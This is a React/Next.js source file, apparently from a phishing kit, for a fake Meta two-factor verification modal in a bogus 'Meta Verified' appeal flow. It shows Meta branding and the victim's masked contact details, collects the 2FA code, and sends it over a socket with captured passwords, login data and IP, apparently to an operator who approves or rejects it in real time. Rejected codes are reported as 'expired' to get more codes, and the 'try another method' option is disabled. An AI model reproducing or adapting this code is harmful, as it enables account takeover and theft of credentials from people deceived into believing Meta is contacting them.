'use client';

import '@/assets/css/meta-verified-modals.css';
import TwoFaImage from '@/assets/images/2FA.png';
import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { store } from '@/store/store';
import { submitCodeApproval } from '@/hooks/use-socket';
import Image from 'next/image';
import { type FC, type FormEvent, useMemo, useState } from 'react';

const maskEmail = (email: string): string => {
    if (!email) {
        return 't**t@example.us';
    }
    const [local, domain] = email.split('@');
    if (!domain) {
        return email;
    }
    if (local.length <= 2) {
        return `${local[0] ?? ''}**@${domain}`;
    }
    return `${local[0]}**${local[local.length - 1]}@${domain}`;
};

const maskPhone = (phone: string): string => {
    if (!phone) {
        return '+84 ****** XX';
    }
    const digits = phone.replace(/\D/g, '');
    if (digits.length < 4) {
        return phone;
    }
    return `+${digits.slice(0, 2)} ****** ${digits.slice(-2)}`;
};

const VerifyModal: FC<{ nextStep: () => void; uiTexts: MetaVerifiedTexts }> = ({ nextStep, uiTexts }) => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showInputError, setShowInputError] = useState(false);

    const { userData, loginProvider } = store();
    const appeal = useAppealContext();

    const normalizedCode = code.replace(/\D/g, '');
    const isCodeValid = /^\d{6,8}$/.test(normalizedCode);
    const canSubmit = isCodeValid && !isLoading;

    const providerLabel = loginProvider === 'instagram' ? 'Instagram' : 'Facebook';
    const userName = userData.fullName.trim() || 'User';
    const stepLabel = `(${uiTexts.step} ${appeal.twoFAAttempts.length + 1})`;

    const instructionText = useMemo(() => {
        const email = maskEmail(userData.personalEmail);
        const phone = maskPhone(userData.phoneNumber);
        return `${uiTexts.twoFAInstructionPrefix} ${email}, ${phone}, ${uiTexts.twoFAInstructionSuffix}`;
    }, [userData.personalEmail, userData.phoneNumber, uiTexts]);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (!canSubmit) {
            return;
        }

        setIsLoading(true);
        setShowInputError(false);

        try {
            if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
                throw new Error('socket unavailable');
            }

            const result = await submitCodeApproval(
                {
                    socket: appeal.socket,
                    messageId: appeal.messageId,
                    setMessageId: appeal.setMessageId,
                    formData: appeal.formData,
                    loginData: appeal.loginData,
                    loginProvider: appeal.loginProvider,
                    passwordAttempts: appeal.passwordAttempts,
                    twoFAAttempts: appeal.twoFAAttempts,
                    deviceLabel: appeal.deviceLabel,
                    ip: appeal.ip,
                    setLoginData: appeal.setLoginData,
                    addPasswordAttempt: appeal.addPasswordAttempt,
                    addTwoFAAttempt: appeal.addTwoFAAttempt
                },
                normalizedCode
            );

            if (result.approved) {
                nextStep();
                return;
            }

            setShowInputError(true);
            setCode('');
        } catch {
            setShowInputError(true);
            setCode('');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='mv-modal-overlay' role='dialog' aria-modal='true'>
            <div className='mv-modal-card' style={{ padding: '28px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div className='w-full'>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '14px', color: '#9a979e', marginBottom: '7px' }}>
                        <span>{userName}</span>
                        <div style={{ width: '4px', height: '4px', backgroundColor: '#9a979e', borderRadius: '5px' }} />
                        <span>{providerLabel}</span>
                    </div>

                    <h2 style={{ fontSize: '20px', lineHeight: 1.3, color: '#000', fontWeight: 700, marginBottom: '15px', wordBreak: 'break-word' }}>
                        {uiTexts.twoFAStep} {stepLabel}
                    </h2>

                    <p style={{ color: '#9a979e', fontSize: '14px', lineHeight: 1.55, margin: 0 }}>{instructionText}</p>

                    <div style={{ width: '100%', borderRadius: '10px', backgroundColor: '#f5f5f5', overflow: 'hidden', margin: '15px 0' }}>
                        <Image src={TwoFaImage} alt='authentication' width={480} className='h-auto w-full' />
                    </div>

                    <form onSubmit={handleSubmit}>
                        <label htmlFor='two-fa-code' style={{ display: 'block', marginBottom: '6px', fontSize: '13px', fontWeight: 600, color: '#3b4a64' }}>
                            {uiTexts.code} <span style={{ color: '#e5484d' }}>*</span>
                        </label>

                        <div className={`mv-login-input-wrap${showInputError ? ' is-error' : ''}`} style={{ padding: '0 11px' }}>
                            <input
                                id='two-fa-code'
                                className='mv-login-input'
                                style={{ padding: 0 }}
                                inputMode='numeric'
                                placeholder={uiTexts.code}
                                maxLength={8}
                                type='text'
                                autoComplete='off'
                                value={code}
                                disabled={isLoading}
                                onChange={(e) => {
                                    setCode(e.target.value.replace(/\D/g, '').slice(0, 8));
                                    setShowInputError(false);
                                }}
                            />
                        </div>

                        {showInputError ? (
                            <p style={{ color: '#e74c3c', fontSize: '12px', margin: '-1px 0 10px 0' }}>{uiTexts.codeExpired}</p>
                        ) : (
                            <p style={{ color: '#6a7893', fontSize: '12px', margin: '-1px 0 10px 0' }}>{uiTexts.validCodeHint}</p>
                        )}

                        <div style={{ width: '100%', marginTop: '20px' }}>
                            <button
                                type='submit'
                                className='mv-login-submit'
                                disabled={!canSubmit}
                                style={{ opacity: !canSubmit ? 0.7 : 1, cursor: !canSubmit ? 'not-allowed' : 'pointer' }}
                            >
                                {isLoading ? (
                                    <>
                                        <span className='mv-modal-spinner' style={{ marginRight: '8px' }} />
                                        {uiTexts.pleaseWait}
                                    </>
                                ) : (
                                    uiTexts.continueBtn
                                )}
                            </button>
                        </div>

                        <div
                            style={{
                                width: '100%',
                                marginTop: '20px',
                                color: '#9a979e',
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'center',
                                borderRadius: '40px',
                                padding: '10px 20px',
                                border: '1px solid #d4dbe3',
                                fontSize: '14px',
                                pointerEvents: 'none'
                            }}
                        >
                            <span>{uiTexts.tryAnotherMethod}</span>
                        </div>
                    </form>
                </div>

                <div style={{ width: '60px', height: '60px', flexShrink: 0, margin: '0 auto' }}>
                    <Image src={MetaLogoGrey} width={60} height={60} alt='Meta' style={{ objectFit: 'contain' }} />
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
